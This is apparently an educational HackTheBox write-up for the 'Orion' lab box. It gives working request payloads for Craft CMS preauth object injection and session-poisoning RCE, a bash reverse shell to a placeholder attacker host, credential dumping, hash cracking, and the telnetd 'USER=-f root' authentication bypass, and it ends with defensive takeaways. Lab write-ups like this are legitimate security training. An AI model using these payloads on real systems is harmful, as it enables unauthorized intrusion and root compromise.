@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB: Orion | Zakir Hussain</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+
+:root{
+  --bg:#0a0e17;
+  --bg-elev:#0e1420;
+  --bg-card:#111827;
+  --bg-code:#0b1018;
+  --border:#1e2838;
+  --border-soft:#172030;
+  --text:#dbe4ef;
+  --text-dim:#8b98ac;
+  --text-faint:#5b6678;
+  --accent:#2dd4a7;
+  --accent-soft:rgba(45,212,167,.12);
+  --accent-2:#38bdf8;
+  --warn:#f59e0b;
+  --danger:#ef4444;
+  --easy:#2dd4a7;
+  --medium:#f5a623;
+  --hard:#ef5a6f;
+  --mono: 'JetBrains Mono', ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  --sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+}
+@media (prefers-color-scheme: light){
+  :root{ color-scheme: dark; }
+}
+*{box-sizing:border-box;}
+html,body{margin:0;padding:0;}
+body{
+  background:
+    radial-gradient(1100px 500px at 15% -5%, rgba(45,212,167,.07), transparent 60%),
+    radial-gradient(900px 500px at 100% 0%, rgba(56,189,248,.05), transparent 55%),
+    var(--bg);
+  color:var(--text);
+  font-family:var(--sans);
+  font-size:16px;
+  line-height:1.65;
+  -webkit-font-smoothing:antialiased;
+}
+::selection{background:var(--accent-soft); color:var(--text);}
+a{color:var(--accent-2); text-decoration:none;}
+a:hover{text-decoration:underline;}
+.wrap{max-width:860px; margin:0 auto; padding:0 24px 96px;}
+
+/* ---------- topbar ---------- */
+.topbar{
+  border-bottom:1px solid var(--border-soft);
+  background:rgba(10,14,23,.85);
+  backdrop-filter:blur(8px);
+  position:sticky; top:0; z-index:20;
+}
+.topbar-inner{
+  max-width:860px; margin:0 auto; padding:14px 24px;
+  display:flex; align-items:center; justify-content:space-between;
+  gap:12px; flex-wrap:wrap;
+}
+.back-link{
+  font-family:var(--mono); font-size:13px; color:var(--text-dim);
+  display:flex; align-items:center; gap:6px;
+}
+.back-link:hover{color:var(--accent); text-decoration:none;}
+.brand{
+  font-family:var(--mono); font-size:13px; color:var(--text-faint); letter-spacing:.03em;
+}
+
+/* ---------- hero ---------- */
+.hero{padding:48px 0 28px; border-bottom:1px solid var(--border-soft);}
+.eyebrow{
+  font-family:var(--mono); font-size:12.5px; color:var(--accent);
+  letter-spacing:.04em; margin:0 0 14px;
+  display:flex; align-items:center; gap:8px;
+}
+.eyebrow::before{content:"//"; color:var(--text-faint);}
+h1.machine-title{
+  font-family:var(--mono); font-weight:700; font-size:clamp(32px,6vw,48px);
+  margin:0 0 14px; color:#fff; letter-spacing:-.01em;
+}
+.badges{display:flex; flex-wrap:wrap; gap:8px; margin-bottom:20px;}
+.badge{
+  font-family:var(--mono); font-size:12px; padding:5px 11px; border-radius:5px;
+  border:1px solid var(--border); background:var(--bg-card); color:var(--text-dim);
+  display:inline-flex; align-items:center; gap:6px;
+}
+.badge.diff-Easy{color:var(--easy); border-color:rgba(45,212,167,.35); background:rgba(45,212,167,.08);}
+.badge.diff-Medium{color:var(--medium); border-color:rgba(245,166,35,.35); background:rgba(245,166,35,.08);}
+.badge.diff-Hard{color:var(--hard); border-color:rgba(239,90,111,.35); background:rgba(239,90,111,.08);}
+.badge.os{color:var(--accent-2);}
+.synopsis{color:var(--text-dim); font-size:16px; max-width:70ch; margin:0;}
+.tags{display:flex; flex-wrap:wrap; gap:6px; margin-top:18px;}
+.tag{
+  font-family:var(--mono); font-size:11.5px; color:var(--text-faint);
+  border:1px solid var(--border-soft); padding:3px 9px; border-radius:999px;
+}
+
+/* ---------- info table ---------- */
+.info-grid{
+  display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr));
+  gap:1px; background:var(--border-soft); border:1px solid var(--border-soft);
+  border-radius:10px; overflow:hidden; margin:28px 0 8px;
+}
+.info-cell{background:var(--bg-card); padding:14px 16px;}
+.info-cell .k{font-family:var(--mono); font-size:11px; color:var(--text-faint); text-transform:uppercase; letter-spacing:.06em; margin-bottom:4px;}
+.info-cell .v{font-family:var(--mono); font-size:14px; color:var(--text);}
+
+/* ---------- section ---------- */
+section.phase{padding:40px 0; border-bottom:1px solid var(--border-soft);}
+section.phase:last-of-type{border-bottom:none;}
+.phase-head{display:flex; align-items:baseline; gap:12px; margin-bottom:6px;}
+.phase-num{font-family:var(--mono); color:var(--accent); font-size:14px;}
+h2.phase-title{font-family:var(--mono); font-size:22px; margin:0; color:#fff; font-weight:700;}
+.phase-intro{color:var(--text-dim); margin:10px 0 22px; max-width:72ch;}
+
+.step{margin:22px 0;}
+.step-title{
+  font-family:var(--mono); font-size:14.5px; color:var(--text); font-weight:700;
+  margin:0 0 4px; display:flex; align-items:center; gap:8px;
+}
+.step-title::before{content:"▸"; color:var(--accent);}
+.why{
+  font-size:14.5px; color:var(--text-dim); margin:6px 0 10px; padding-left:18px;
+  border-left:2px solid var(--border-soft);
+}
+.why b{color:var(--accent); font-family:var(--mono); font-weight:600; font-size:12px; text-transform:uppercase; letter-spacing:.05em; margin-right:6px;}
+
+pre{
+  background:var(--bg-code); border:1px solid var(--border);
+  border-radius:8px; padding:14px 16px; overflow-x:auto;
+  font-family:var(--mono); font-size:13px; line-height:1.55; margin:10px 0;
+  color:#c9d6e8;
+}
+pre.cmd{border-left:3px solid var(--accent);}
+pre.out{border-left:3px solid var(--accent-2); color:#9fb0c3;}
+code{font-family:var(--mono); font-size:.92em;}
+.inline-code{background:var(--bg-code); border:1px solid var(--border); border-radius:4px; padding:1px 6px; color:var(--accent); font-size:.88em;}
+
+.next{font-size:14.5px; color:var(--text-dim); margin:10px 0 0; padding-left:18px; border-left:2px solid rgba(56,189,248,.35);}
+.next b{color:var(--accent-2); font-family:var(--mono); font-weight:600; font-size:12px; text-transform:uppercase; letter-spacing:.05em; margin-right:6px;}
+
+.callout{
+  border:1px solid var(--border); border-left:3px solid var(--warn);
+  background:rgba(245,166,35,.06); border-radius:8px; padding:14px 18px; margin:18px 0;
+}
+.callout.cve{border-left-color:var(--danger); background:rgba(239,90,111,.06);}
+.callout .ctitle{font-family:var(--mono); font-size:12.5px; color:var(--warn); text-transform:uppercase; letter-spacing:.05em; margin-bottom:6px; font-weight:700;}
+.callout.cve .ctitle{color:var(--danger);}
+.callout p{margin:0; color:var(--text-dim); font-size:14.5px;}
+
+.flagbox{
+  font-family:var(--mono); background:var(--bg-code); border:1px dashed var(--border);
+  border-radius:8px; padding:12px 16px; margin:10px 0; display:flex; align-items:center; gap:10px;
+  font-size:13.5px; color:var(--accent);
+}
+.flagbox .lbl{color:var(--text-faint); font-size:11px; text-transform:uppercase; letter-spacing:.06em;}
+
+table.vulns{width:100%; border-collapse:collapse; margin:14px 0; font-size:14px;}
+table.vulns th, table.vulns td{border:1px solid var(--border-soft); padding:9px 12px; text-align:left;}
+table.vulns th{background:var(--bg-card); font-family:var(--mono); font-size:11.5px; color:var(--text-faint); text-transform:uppercase; letter-spacing:.05em;}
+table.vulns td{color:var(--text-dim);}
+
+.chain{
+  font-family:var(--mono); font-size:12.5px; color:var(--text-dim);
+  background:var(--bg-code); border:1px solid var(--border); border-radius:8px;
+  padding:16px; overflow-x:auto; white-space:pre; margin:20px 0;
+}
+
+ul.rec-list{margin:10px 0; padding-left:0; list-style:none;}
+ul.rec-list li{
+  padding:8px 0 8px 26px; position:relative; color:var(--text-dim); font-size:14.5px;
+  border-bottom:1px solid var(--border-soft);
+}
+ul.rec-list li:last-child{border-bottom:none;}
+ul.rec-list li::before{content:"→"; position:absolute; left:0; color:var(--accent);}
+
+.summary-box{
+  background:var(--bg-card); border:1px solid var(--border); border-radius:10px;
+  padding:22px 24px; margin:24px 0;
+}
+.summary-box h3{font-family:var(--mono); font-size:15px; color:#fff; margin:0 0 10px;}
+
+footer.page-footer{
+  padding:40px 0 10px; text-align:center; color:var(--text-faint); font-family:var(--mono); font-size:12.5px;
+}
+footer.page-footer a{color:var(--text-dim);}
+.foot-nav{margin-bottom:14px;}
+
+@media (max-width:600px){
+  .wrap{padding:0 16px 72px;}
+  h1.machine-title{font-size:30px;}
+}
+
+</style>
+</head>
+<body>
+<div class="topbar">
+  <div class="topbar-inner">
+    <a class="back-link" href="https://zak5886.github.io/Portfolio/#writeups">&larr; back to writeups</a>
+    <span class="brand">ZAKIR_HUSSAIN / HTB_WRITEUPS</span>
+  </div>
+</div>
+<div class="wrap">
+
+<div class="hero">
+  <p class="eyebrow">HTB_WRITEUP // orion.log</p>
+  <h1 class="machine-title">Orion</h1>
+  <div class="badges"><span class="badge diff-Easy">Easy</span><span class="badge os">Linux</span></div>
+  <p class="synopsis">Orion is an Easy-difficulty Linux box built around a telecom company's Craft CMS site. The foothold chains an unauthenticated RCE in Craft's image-transform endpoint with an object-injection flaw in the underlying Yii framework to poison a PHP session file and smuggle in a payload. Root turns out to be entirely optional for the intended user path and instead comes from a deliberately reinstated legacy service &mdash; inetd serving telnet &mdash; carrying a decades-old authentication-bypass bug in telnetd itself.</p>
+  <div class="tags"><span class="tag">nmap</span><span class="tag">feroxbuster</span><span class="tag">craftcms</span><span class="tag">yii-framework</span><span class="tag">cve-2025-32432</span><span class="tag">cve-2024-58136</span><span class="tag">php-object-injection</span><span class="tag">session-poisoning</span><span class="tag">metasploit</span><span class="tag">hashcat</span><span class="tag">bcrypt</span><span class="tag">inetd</span><span class="tag">telnet</span><span class="tag">cve-2026-24061</span><span class="tag">auth-bypass</span></div>
+</div>
+<div class="info-grid"><div class="info-cell"><div class="k">Target</div><div class="v">Orion</div></div><div class="info-cell"><div class="k">Difficulty</div><div class="v">Easy</div></div><div class="info-cell"><div class="k">OS</div><div class="v">Linux</div></div><div class="info-cell"><div class="k">Primary Vuln</div><div class="v">Craft CMS Preauth RCE</div></div><div class="info-cell"><div class="k">CVE (foothold)</div><div class="v">CVE-2025-32432</div></div><div class="info-cell"><div class="k">CVE (root)</div><div class="v">CVE-2026-24061</div></div></div>
+
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 1</span></div>
+  <h2 class="phase-title">Reconnaissance</h2>
+  <p class="phase-intro">Two open ports, both standard &mdash; so the entire attack surface is a single web application once the hostname is resolved.</p>
+  
+<div class="step">
+  <p class="step-title">Full-range port scan</p>
+  <p class="why"><b>Why</b>A fast full-range sweep first to make sure nothing is hiding outside the usual top-1000, followed by a detailed version/script scan against only the ports found open.</p>
+  <pre class="cmd">nmap -p- --min-rate 10000 &lt;TARGET&gt;
+nmap -p 22,80 -sCV &lt;TARGET&gt;</pre>
+  <pre class="out">22/tcp open ssh   OpenSSH 8.9p1 Ubuntu
+80/tcp open http  nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://orion.htb/</pre>
+  <p class="next"><b>Next</b>Resolve orion.htb locally and load the site to see what's actually being served.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Fingerprint the web stack</p>
+  <p class="why"><b>Why</b>The HTTP response headers advertise <code>X-Powered-By: Craft CMS</code>, and the application's own debug error page confirms it's running on the Yii PHP framework underneath &mdash; the combination that matters here, since Craft is built on top of Yii and several of Craft's historical CVEs are really bugs in how it hands data to Yii.</p>
+  
+  
+  <p class="next"><b>Next</b>Craft CMS has a documented admin control-panel path; check its version there rather than brute-forcing for it.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Identify the Craft version and admin panel</p>
+  <p class="why"><b>Why</b>Craft's own documentation places the control panel at <code>/admin</code>; the login page footer discloses the exact running version.</p>
+  
+  <pre class="out">Craft CMS 5.6.16</pre>
+  <p class="next"><b>Next</b>That version is squarely inside the affected range for a known preauth RCE &mdash; CVE-2025-32432. Confirm and plan the exploit chain before touching the admin login form itself.</p>
+</div>
+
+  
+</section>
+<div class="callout cve"><div class="ctitle">CVE-2025-32432 &mdash; Craft CMS Preauth RCE via Yii Object Injection</div><p>Craft's unauthenticated <code>admin/actions/assets/generate-transform</code> endpoint passes attacker-controlled JSON into the <code>ImageTransform</code> constructor without validating it. Yii's <code>as &lt;name&gt;</code> behavior syntax lets an attacker inject arbitrary object properties, and a separate Yii-framework bug (CVE-2024-58136) means the framework honors a smuggled <code>__class</code> key over the <code>class</code> key Craft actually validates &mdash; so an attacker can instantiate any PHP class they like, with constructor arguments of their choosing, entirely preauth. This was added to CISA's Known Exploited Vulnerabilities catalog after being found used in a real in-the-wild campaign.</p></div>
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 2</span></div>
+  <h2 class="phase-title">Foothold &mdash; Proving the Object Injection</h2>
+  <p class="phase-intro">Before chasing full RCE, the first move is a low-risk proof of concept: get the injected object to call something harmless and observable, like <code>phpinfo()</code>, to confirm the primitive actually works against this target.</p>
+  
+<div class="step">
+  <p class="step-title">Collect a session and CSRF token</p>
+  <p class="why"><b>Why</b>The vulnerable endpoint still expects a valid session cookie and CSRF token even though it requires no login &mdash; both are handed out freely by the public login page.</p>
+  <pre class="cmd">curl http://orion.htb/admin/login -v -s 2&gt;&amp;1 | grep -i -e 'set-cookie' -e 'type="hidden"'</pre>
+  
+  <p class="next"><b>Next</b>Use the session cookie and CSRF token together in a crafted POST to the vulnerable transform endpoint.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Send the object-injection PoC</p>
+  <p class="why"><b>Why</b>The <code>as session</code> key is added alongside the legitimate <code>handle</code> fields. Craft validates the benign <code>class</code> value, but Yii's constructor-resolution logic prefers the smuggled <code>__class</code> instead &mdash; instantiating a <code>GuzzleHttp\Psr7\FnStream</code> object whose <code>_fn_close</code> callback is set to <code>phpinfo</code>.</p>
+  <pre class="cmd">POST /index.php?p=admin/actions/assets/generate-transform HTTP/1.1
+Host: orion.htb
+Cookie: CraftSessionId=...; CRAFT_CSRF_TOKEN=...
+X-CSRF-Token: ...
+Content-Type: application/json
+
+{"assetId": 11, "handle": {"width": 123, "height": 123,
+  "as session": {
+    "class": "craft\\behaviors\\FieldLayoutBehavior",
+    "__class": "GuzzleHttp\\Psr7\\FnStream",
+    "__construct()": [[]],
+    "_fn_close": "phpinfo"
+}}}</pre>
+  <pre class="out">A full PHPinfo page renders in the response &amp;mdash; confirming arbitrary class instantiation.</pre>
+  <p class="next"><b>Next</b>Swap the harmless phpinfo gadget for a class that actually executes attacker-controlled PHP from disk.</p>
+</div>
+
+  
+</section>
+
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 3</span></div>
+  <h2 class="phase-title">Foothold &mdash; Session Poisoning for Command Execution</h2>
+  <p class="phase-intro">The technique seen used in the wild for this CVE is clever: abuse Craft's own “redirect back after login” feature to smuggle a PHP payload into the session file on disk, then use the object-injection primitive to execute that very file.</p>
+  
+<div class="step">
+  <p class="step-title">Poison the session file with a PHP payload</p>
+  <p class="why"><b>Why</b>Visiting an admin URL while logged out triggers a redirect to the login page, but first caches the originally requested URL &mdash; including any query string &mdash; inside the session file at a predictable path, <code>/var/lib/php/sessions/sess_&lt;id&gt;</code>. A query parameter containing a short PHP snippet lands verbatim inside that file on disk.</p>
+  <pre class="cmd">GET /index.php?p=admin/dashboard&amp;a=&amp;lt;?=file_put_contents(...)?&amp;gt;</pre>
+  
+  <p class="next"><b>Next</b>Use the yii\rbac\PhpManager gadget, whose constructor takes an itemFile path and executes it as PHP, pointed at the poisoned session file.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Load the poisoned session file as PHP via PhpManager</p>
+  <p class="why"><b>Why</b><code>yii\rbac\PhpManager</code>'s constructor accepts an <code>itemFile</code> path that it subsequently includes and executes. Pointing that path at the attacker's own session file (named from the current session cookie) turns the earlier write primitive into genuine code execution.</p>
+  <pre class="cmd">{"assetId": 11, "handle": {"width": 123, "height": 123,
+  "as hack": {
+    "class": "\\craft\\behaviors\\FieldLayoutBehavior",
+    "__class": "\\yii\\rbac\\PhpManager",
+    "__construct()": [{"itemFile": "/var/lib/php/sessions/sess_&lt;id&gt;"}]
+}}}</pre>
+  
+  <p class="next"><b>Next</b>Validate blind execution first with something observable over the network, since the endpoint crashes to a 500 either way and returns no output.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Confirm execution blind, then upgrade to a reverse shell</p>
+  <p class="why"><b>Why</b>An ICMP ping back to the attacking host confirms command execution without needing to read any response body; once confirmed, the same request structure with the <code>cmd</code> parameter swapped for a bash reverse-shell one-liner delivers an interactive shell.</p>
+  <pre class="cmd">cmd=ping -c 1 &lt;LHOST&gt;
+# then:
+cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/443 0&gt;&amp;1'</pre>
+  <pre class="out">www-data@orion:~/html/craft/web$</pre>
+  <p class="next"><b>Next</b>This also happens to be a case where a point-and-click Metasploit module exists for the same CVE &mdash; worth knowing as the faster path in an authorized engagement with time pressure, alongside the manual method for understanding the mechanics.</p>
+</div>
+
+  
+</section>
+
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 4</span></div>
+  <h2 class="phase-title">Shell as adam (Optional Path)</h2>
+  <p class="phase-intro">Reaching the named user is not strictly required for root on Orion &mdash; root is directly reachable from www-data &mdash; but the credential chain through the CMS database is worth documenting for completeness, since it demonstrates a classic password-reuse pattern.</p>
+  
+<div class="step">
+  <p class="step-title">Read the Craft .env configuration</p>
+  <p class="why"><b>Why</b>Craft's environment file, sitting alongside the application code, holds database credentials in plaintext &mdash; standard practice for the framework, but only safe if the file itself is properly access-controlled, which it wasn't from the www-data shell already obtained.</p>
+  
+  <pre class="out">CRAFT_DB_USER=root
+CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!</pre>
+  <p class="next"><b>Next</b>That password doesn't work for the OS-level adam account, but it does authenticate to the local MariaDB instance &mdash; dump the users table from there instead.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Dump the application's users table</p>
+  <p class="why"><b>Why</b>Craft stores its own application-level users (distinct from OS accounts) in its database, bcrypt-hashed.</p>
+  <pre class="cmd">mysql -u root -p'SuperSecureCraft123Pass!' -e "use orion; select id,admin,username,email,password from users;"</pre>
+  <pre class="out">admin | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz...</pre>
+  <p class="next"><b>Next</b>Crack the recovered bcrypt hash offline rather than attempting to brute-force the live login form.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Crack the bcrypt hash</p>
+  <p class="why"><b>Why</b>bcrypt is intentionally slow, so a crackable HTB hash is almost always near the top of a common wordlist &mdash; and this one breaks in well under a minute against rockyou.txt.</p>
+  <pre class="cmd">hashcat adam.hash /path/rockyou.txt -m 3200</pre>
+  <pre class="out">$2y$13$e9zu...:darkangel</pre>
+  <p class="next"><b>Next</b>Test the cracked password against both su (locally) and SSH (externally) &mdash; it works for both, confirming password reuse between the CMS account and the OS account.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Switch user / SSH as adam</p>
+  <p class="why"><b>Why</b>The cracked password works both for a local privilege switch and for direct SSH login &mdash; confirming the app-level and OS-level credentials were reused.</p>
+  <pre class="cmd">su - adam
+# or: ssh adam@orion.htb</pre>
+  
+  <p class="next"><b>Next</b>Grab user.txt, then move to enumerating root-reachable services &mdash; adam has no sudo rights, so the actual privilege-escalation path lies elsewhere.</p>
+</div>
+
+  
+</section>
+
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 5</span></div>
+  <h2 class="phase-title">Root &mdash; A Deliberately Reinstated Legacy Service</h2>
+  <p class="phase-intro">Process enumeration is what gives this away: a process that simply should not exist on a modern Ubuntu install.</p>
+  
+<div class="step">
+  <p class="step-title">Enumerate running processes</p>
+  <p class="why"><b>Why</b>A full process listing surfaces <span class="inline-code">inetutils-inetd</span> running as root &mdash; the classic Unix “super-server” that modern Ubuntu replaced with systemd socket activation well over a decade ago. Its presence here is not an accident of a stock install; someone had to deliberately apt-install it.</p>
+  <pre class="cmd">ps auxww | grep inetd</pre>
+  <pre class="out">root   1022  /usr/sbin/inetutils-inetd</pre>
+  <p class="next"><b>Next</b>Read its configuration to see exactly what service it's set up to launch, and as which user.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Read the inetd configuration</p>
+  <p class="why"><b>Why</b><code>inetd.conf</code> shows a single active entry: telnet, bound to loopback only, launched as root via the GNU inetutils <code>telnetd</code> implementation.</p>
+  
+  <pre class="out">127.0.0.1:telnet stream tcp nowait root /usr/local/sbin/telnetd telnetd</pre>
+  <p class="next"><b>Next</b>Check the telnetd version for known CVEs &mdash; GNU inetutils telnetd has a notably bad security history.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Identify the telnetd version and research CVEs</p>
+  <p class="why"><b>Why</b>Version 2.7 of GNU inetutils telnetd matches two separate CVEs that both made CISA's KEV catalog around the same time: a buffer-overflow in LINEMODE SLC handling (CVE-2026-32746, which an independent research team publicly noted they couldn't fully weaponize to RCE), and a much simpler, decades-old authentication-bypass bug (CVE-2026-24061) &mdash; the practical path here.</p>
+  <pre class="cmd">telnetd --version</pre>
+  <pre class="out">telnetd (GNU inetutils) 2.7</pre>
+  
+</div>
+
+  
+</section>
+<div class="callout cve"><div class="ctitle">CVE-2026-24061 &mdash; telnetd USER Environment-Variable Auth Bypass</div><p>telnetd invokes <code>/usr/bin/login</code> (as root) and passes the client-supplied <code>USER</code> environment variable straight through as its final argument, with no sanitization. <code>login</code> itself supports a <code>-f &lt;user&gt;</code> flag that skips password authentication entirely. By setting <code>USER</code> to the literal string <code>-f root</code> and enabling environment forwarding on the telnet client, a remote attacker is logged in as root with zero credentials &mdash; a bug whose root cause (unsanitized argument smuggling via an environment variable) predates most of the systems it was later found affecting.</p></div>
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 6</span></div>
+  <h2 class="phase-title">Root Shell</h2>
+  <p class="phase-intro">Exploitation here is almost anticlimactic given everything that led up to it &mdash; it's a single environment-variable assignment.</p>
+  
+<div class="step">
+  <p class="step-title">Smuggle -f root through the USER variable</p>
+  <p class="why"><b>Why</b>Setting <code>USER</code> to <code>-f root</code> and passing <code>-a</code> (auto-login, which forwards the <code>USER</code> env var) to the telnet client triggers the vulnerable code path in the target's <code>login</code> invocation.</p>
+  <pre class="cmd">USER="-f root" telnet -a localhost</pre>
+  <pre class="out">Connected to localhost.
+...
+Welcome to Ubuntu 22.04.5 LTS
+root@orion:~#</pre>
+  <p class="next"><b>Next</b>Grab root.txt to close out the box.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Confirm root flag</p>
+  <p class="why"><b>Why</b>Final checkpoint confirming full compromise.</p>
+  <pre class="cmd">cat root.txt</pre>
+  
+  
+</div>
+
+  
+</section>
+<div class="summary-box"><h3>Key Takeaways</h3><ul class="rec-list"><li>Frameworks that resolve object type from attacker-influenced data (Yii’s <code>__class</code> precedence over <code>class</code>) create a dangerous object-injection surface wherever a higher-level application like Craft CMS passes user input into a constructor without an explicit allow-list of safe classes.</li><li>Any feature that writes attacker-influenced data to a predictable path on disk (here, a session-cache "redirect back to this URL" convenience) is a file-write primitive in disguise, and should never be combined with a separate gadget capable of executing arbitrary files.</li><li>Legacy super-server daemons like inetd/telnetd have no place on a modern server; if they must exist for a specific reason, that reason needs to be weighed against a long, ongoing history of serious memory-safety and authentication bugs in those codebases.</li><li>Password reuse between an application’s own user store (Craft CMS) and OS-level accounts (adam) turned a single cracked hash into both a local login and a remote SSH foothold &mdash; enforce separate credential domains.</li></ul><p style="margin-top:14px;color:var(--text-faint);font-size:13px;"></a></p></div>
+<footer class="page-footer">
+  <div class="foot-nav"><a href="https://zak5886.github.io/Portfolio/#writeups">&larr; All writeups</a> &nbsp;|&nbsp; <a href="https://zak5886.github.io/Portfolio/">Portfolio home</a></div>
+  Educational penetration testing writeup &middot; HackTheBox lab environment &middot; &copy; 2026 Zakir Hussain
+</footer>
+</div>
+</body>
+</html>
